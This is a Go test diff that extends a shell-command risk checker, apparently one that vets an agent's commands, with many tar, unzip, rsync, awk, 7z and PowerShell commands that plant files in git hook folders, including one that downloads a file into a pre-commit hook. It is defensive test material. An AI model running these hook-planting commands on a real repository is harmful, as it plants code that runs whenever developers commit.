@@ -67,6 +67,21 @@ func TestShellWritesIntoGitHookPlacesAreHeld(t *testing.T) {
 		"echo evil 2> .git/hooks/pre-commit",
 		"echo evil > ./.git/HOOKS/pre-commit",
 		"FOO=1 tee .git/hooks/x",
+		// archives, syncs and in-place editors (the Security Reviewer's point 1 on #89)
+		"tar -xf hooks.tar -C .git/hooks",
+		"tar xf hooks.tar -C .git/hooks",
+		"tar -xzf hooks.tgz --directory=.git/hooks",
+		"tar -xf hooks.tar -C.husky",
+		"tar --extract -f hooks.tar -C .githooks",
+		"unzip hooks.zip -d .git/hooks",
+		"unzip -o hooks.zip -d.husky",
+		"rsync -a hooks/ .git/hooks/",
+		"rsync -av --delete src/ .husky",
+		"rsync -a evil.sh .git/hooks/pre-commit",
+		"awk -i inplace '{print}' .git/hooks/pre-commit",
+		"gawk -i inplace -v x=1 '{print}' .husky/pre-commit",
+		"7z x hooks.7z -o.git/hooks",
+		"cd .git/hooks && tar -xf ../../h.tar -C .",
 	}
 	for _, c := range held {
 		assert.NotEmpty(t, shellRisk(c, wd), "should be held: %s", c)
@@ -93,6 +108,16 @@ func TestShellWritesIntoGitHookPlacesAreHeld(t *testing.T) {
 		"mkdir -p .husky",
 		"ln -s a b",
 		"echo x > .git/HEAD.tmp.notexistent-but-harmless/../../notes.txt",
+		"tar -xf src.tar -C build",
+		"tar -czf out.tgz -C .git/hooks .",
+		"tar -tf hooks.tar",
+		"unzip src.zip -d build",
+		"unzip -l hooks.zip",
+		"rsync -a src/ build/",
+		"rsync -a .git/hooks/ backup/",
+		"awk '{print}' .git/hooks/pre-commit",
+		"awk -i inplace '{print}' notes.txt",
+		"7z x src.7z -obuild",
 	}
 	for _, c := range allowed {
 		why := shellRisk(c, wd)
@@ -142,6 +167,24 @@ func TestPowerShellAndCmdWritesIntoGitHookPlacesAreHeld(t *testing.T) {
 		`Set-Content -LiteralPath '.git\hooks\pre-commit' -Value 'evil'`,
 		`Set-Content .GIT\Hooks\Pre-Commit evil`,
 		`git config -f .git\config user.name x`,
+		// archives, and the folder a PowerShell cd moved to (points 1 and 2)
+		`Expand-Archive hooks.zip -DestinationPath .git\hooks`,
+		`Expand-Archive -Path hooks.zip -DestinationPath .git\hooks -Force`,
+		`Expand-Archive hooks.zip .husky`,
+		`tar -xf hooks.tar -C .git\hooks`,
+		`tar.exe -xf hooks.tar -C .githooks`,
+		`unzip hooks.zip -d .git\hooks`,
+		`7z x hooks.7z -o.git\hooks`,
+		`Set-Location .git\hooks; Set-Content pre-commit evil`,
+		`cd .git\hooks; Add-Content pre-commit evil`,
+		`cd .git; Set-Content config evil`,
+		`cd .git; cd hooks; 'evil' | Out-File pre-commit`,
+		`sl .husky; Copy-Item ..\evil.ps1 .`,
+		`Push-Location .git\hooks; Set-Content pre-commit evil`,
+		`pushd .git\hooks && echo evil> pre-commit`,
+		`cd .git\hooks; Invoke-WebRequest https://example.com/x -OutFile pre-commit`,
+		`cd .git\hooks; New-Item pre-commit -Value evil`,
+		`cd .githooks; echo evil > pre-commit`,
 	}
 	for _, c := range held {
 		assert.NotEmpty(t, shellRisk(c, wd), "should be held: %s", c)
@@ -159,6 +202,12 @@ func TestPowerShellAndCmdWritesIntoGitHookPlacesAreHeld(t *testing.T) {
 		`Invoke-WebRequest https://example.com/x -OutFile out.html`,
 		`Get-ChildItem .git\hooks`,
 		`git config -f settings.cfg user.name x`,
+		`Expand-Archive src.zip -DestinationPath build`,
+		`tar -xf src.tar -C build`,
+		`tar -czf out.tgz -C .git\hooks .`,
+		`cd src; Set-Content notes.txt hi`,
+		`cd .git\hooks; Get-Content pre-commit`,
+		`cd build; Set-Content hooks.txt hi`,
 	}
 	for _, c := range allowed {
 		assert.Empty(t, shellRisk(c, wd), "should be allowed: %s", c)
